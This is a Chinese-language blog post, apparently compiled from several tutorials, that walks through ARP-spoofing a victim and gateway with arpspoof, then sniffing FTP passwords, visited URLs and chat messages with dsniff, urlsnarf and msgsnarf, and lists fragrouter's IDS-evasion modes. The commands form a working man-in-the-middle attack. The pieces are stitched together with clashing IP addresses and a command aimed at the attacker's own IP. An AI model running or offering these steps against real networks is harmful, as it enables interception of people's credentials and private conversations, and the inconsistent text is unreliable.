---
title: Dsniff
date: 2016-03-29T21:25:45+08:00
update: 2016-01-01
categories: [网络安全]
tags:
---
Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：

Msgsnarf
Urlsnarf
Mailsnarf
Filesnarf
dnsspoof

在如下攻击场景中：

攻击者IP： 192.168.1.12
被攻击主机IP:192.168.1.6
路由(网关)IP：192.168.1.1

################################################################################
[](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html)

Usage: arpspoof [-i interface] [-t target] host
	-i interface 指定使用的网卡
	-c own|host|both 攻击结束后如何恢复
	-r 				双向毒化
	-t target 指定要攻击的目标
	host 			指定要拦截的主机(默认为网关)

启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.6.100）发送ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。
1. 下面首先欺骗目标系统，执行命令如下所示：
`arpspoof -i eth0 -t 192.168.6.101 192.168.6.1`
2. 使用Arpspoof欺骗网关。执行命令如下所示：
`arpspoof -i eth0 -t 192.168.6.1 192.168.6.101`

##########
Don't forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.
# echo 1 > /proc/sys/net/ipv4/ip_forward

In order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:
# arpspoof -t victim gateway

In a seperate shell we start the matching command to fool gateway to belive we are victim.
# arpspoof -t gateway victim

################################################################################

让我们开始进行ARPspoof IP转发攻击：

root@bt:~# echo 1 >> /proc/sys/net/ipv4/ip_forwardroot@bt:~# arpspoof -i eth0 -t 192.168.1.6 192.168.1.1root@bt:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12

我刚刚启用端口转发，之后使用arpspoof（dsniff的一个插件）来执行ARP毒化攻击。开启dsniff来捕获已知协议获取密码。

root@bt:~# `dsniff -i eth0`
dsniff: listening on eth0

	如图所示，dsniff成功从受害者主机上捕获了FTP的用户名和密码，尽管这个密码是不正确的，但dsniff可以捕获受害者发送的信息。

因为攻击者的主机作为了默认的路由器（因为进行了ARP欺骗），因此受害主机传输的数据经过攻击者，攻击者很容易可以嗅探到受害者发送的信息。我们可以arpspoof所有网段内的主机，但我们的示例中只ARP欺骗了单个主机。你可以试试其他的dsniif工具，像urlsnarf。

root@bt:~# `urlsnarf -i eth0`
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]

它能捕获受害者访问网站的详细信息。你可以试试msgsnarf捕获即时聊天会话信息，我的意思是如果用户通过雅虎聊天或者任何IRC频道，通过msgsnarf可以捕获受害者所有的谈话，结束攻击需要结束arpspoof。

root@bt:~# killall arpspoof
################################################################################
0x00 fragrouter介绍

fragrouter是一个具有路由器功能的应用程序，它能够对攻击者发送的攻击流量进行分片处理之后，向攻击目标转发。

0x01 fragrouter功能

fragrouter - 入侵检测系统(IDS)逃避工具包

root@kali:~# fragrouter
版本：1.6
用法：fragrouter [-i interface] [-p] [-g hop] [-G hopcount] ATTACK

其中ATTACK是以下之一：

-B1：base-1：正常的IP转发
-F1：frag-1：有序的8字节IP分片
-F2：frag-2：有序的24字节IP分片
-F3：frag-3：有序的8字节IP分片，一个失序
-F4：frag-4：有序的8字节IP分片，一个重复
-F5：frag-5：无序的8字节片段，一个重复
-F6：frag-6：有序的8字节片段，标记最后一个Frag
-F7：frag-7：有序的16字节片段，fwd重写
-T1：tcp-1：3-whs，错误TCP校验和和FIN/RST，有序的1字节段
-T3：tcp-3：3-whs，有序的1字节段，一个重复
-T4：tcp-4：3-whs，有序的1字节段，一次重写
-T5：tcp-5：3-whs，有序的2字节段，fwd重写
-T7：tcp-7：3-whs，有序的1字节段，交织空段
-T8：tcp-8：3-whs，有序的1字节段，一个失序
-T9：tcp-9：3-whs，无序的1字节段
-C2：tcbc-2：3-whs，有序的1字节段，交织的SYN
-C3：tcbc-3：有序的1字节空段，3-whs，有序的1字节段
-R1：tcbt-1：3-whs，RST，3-whs，有序的1字节段
-I2：ins-2：3-whs，有序的1字节段，错误TCP校验和
-I3：ins-3：3-whs，有序的1字节段，不设置ACK
-M1：misc-1：Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/
-M2：misc-2：Linux IP chain - http://www.dataprotect.com/ipchains/
0x02 fragrouter用法示例
`fragrouter -i eth0 -F1`
